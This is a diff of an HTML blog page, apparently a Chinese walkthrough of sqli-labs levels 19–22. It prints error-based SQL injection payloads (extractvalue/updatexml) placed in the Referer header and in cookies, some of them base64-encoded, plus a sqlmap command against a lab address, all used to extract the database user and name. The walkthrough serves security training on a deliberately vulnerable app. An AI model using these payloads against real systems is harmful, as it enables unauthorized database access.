-<p>  <img src="/posts/bb32/19_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/19_2.png" srcset="/img/loading.gif" lazyload class>
+
 <p>的确显示为被修改的内容了，然后在Referer中构造注入语句。</p>
 <h4 id="①获得数据库用户名-1"><a href="#①获得数据库用户名-1" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
@@ -745,7 +784,8 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 
 1<span class="token string">' or extractvalue(1,concat(0x7e,(select user()),0x7e)) and '</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/bb32/19_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/19_3.png" srcset="/img/loading.gif" lazyload class>
+
 <p>②获得数据库名</p>
 <pre class="line-numbers language-bash"><code class="language-bash">payload：
 
@@ -755,26 +795,32 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 
 1<span class="token string">' or extractvalue(1,concat(0x7e,(select database()),0x7e)) and '</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p> <img src="/posts/bb32/19_4.png" srcset="/img/loading.gif" lazyload class> </p>
+<img src="/posts/bb32/19_4.png" srcset="/img/loading.gif" lazyload class> 
+
 <h2 id="Less-20-基于错误的cookie头部POST注入"><a href="#Less-20-基于错误的cookie头部POST注入" class="headerlink" title="Less-20 基于错误的cookie头部POST注入"></a>Less-20 基于错误的cookie头部POST注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p>
-<p>  <img src="/posts/bb32/20.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/20.png" srcset="/img/loading.gif" lazyload class>
+
 <p>可以考虑在cookie中添加注入语句。</p>
 <p>Burp抓包：</p>
 <p>因为是cookie，之前没有登录过，所以没有值，我们将请求发送给自己，然后可以获得cookie值：</p>
-<p>  <img src="/posts/bb32/20_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/20_2.png" srcset="/img/loading.gif" lazyload class>
+
 <p>点击两次发送，能获得cookie值，然后发送到重发器，再从里面添加注入语句。</p>
 <h3 id="①获得数据库用户名-2"><a href="#①获得数据库用户名-2" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 uname<span class="token operator">=</span>Dumb' or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>   <img src="/posts/bb32/20_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/20_3.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②获得数据库名-1"><a href="#②获得数据库名-1" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 uname<span class="token operator">=</span>Dumb' or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>   <img src="/posts/bb32/20_4.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/20_4.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="Less-21-基于错误的复杂的字符型Cookie注入"><a href="#Less-21-基于错误的复杂的字符型Cookie注入" class="headerlink" title="Less-21  基于错误的复杂的字符型Cookie注入"></a>Less-21  基于错误的复杂的字符型Cookie注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p>
-<p>   <img src="/posts/bb32/21.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/21.png" srcset="/img/loading.gif" lazyload class>
+
 <p>跟第二十关差不多，只是将账号用base64加密了。并且只是对uname是进行了(‘uname’)的处理。</p>
 <h4 id="①获得数据库用户名-3"><a href="#①获得数据库用户名-3" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
@@ -784,7 +830,8 @@ uname<span class="token operator">=</span>Dumb'<span class="token punctuation">)
 
 uname<span class="token operator">=</span>RHVtYicpIG9yICh1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IHVzZXIoKSksMHg3ZSksMSkpIw<span class="token operator">==</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>   <img src="/posts/bb32/21_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/21_2.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②获得数据库名-2"><a href="#②获得数据库名-2" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 uname<span class="token operator">=</span>Dumb'<span class="token punctuation">)</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
@@ -793,9 +840,11 @@ uname<span class="token operator">=</span>Dumb'<span class="token punctuation">)
 
 uname<span class="token operator">=</span>RHVtYicpIG9yICh1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpKSM<span class="token operator">=</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/bb32/21_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/21_3.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="Less-22-基于错误的双引号字符型Cookie注入"><a href="#Less-22-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22 基于错误的双引号字符型Cookie注入"></a>Less-22 基于错误的双引号字符型Cookie注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p>
-<p>   <img src="/posts/bb32/22.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/22.png" srcset="/img/loading.gif" lazyload class>
+
 <p>跟第二十关差不多，将账号用base64加密了，并且是对uname是进行了”uname”的处理。</p>
 <h4 id="①获得数据库用户名-4"><a href="#①获得数据库用户名-4" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
@@ -805,7 +854,8 @@ uname<span class="token operator">=</span>Dumb" or <span class="token punctuatio
 
 uname<span class="token operator">=</span>RHVtYiIgb3IgKHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgdXNlcigpKSwweDdlKSwxKSkj
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>   <img src="/posts/bb32/22_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/22_2.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②获得数据库名-3"><a href="#②获得数据库名-3" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 uname<span class="token operator">=</span>Dumb" or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
@@ -814,7 +864,7 @@ uname<span class="token operator">=</span>Dumb" or <span class="token punctuatio
 
 uname<span class="token operator">=</span>dW5hbWU9RHVtYiIgb3IgKHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMSkpIw<span class="token operator">==</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>   <img src="/posts/bb32/22_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/bb32/22_3.png" srcset="/img/loading.gif" lazyload class>
 
             </div>
             <hr>
